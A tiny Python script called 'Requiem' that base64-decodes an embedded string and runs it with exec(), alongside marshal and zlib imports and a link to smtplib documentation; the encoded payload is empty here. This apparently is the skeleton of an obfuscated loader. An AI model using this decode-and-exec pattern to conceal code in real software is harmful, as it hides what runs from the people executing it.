import marshal, zlib, os, sys
# sla se base64 vem pr√©-instalada, lmfao
# Script Name: Requiem
# https://docs.python.org/3.5/library/smtplib.html 
# http://stackoverflow.com/a/27515833/2684304
try:
	import base64
except:
	os.system("pip install base64")
	import base64
a = (base64.b64decode(''''''))
exec(a)
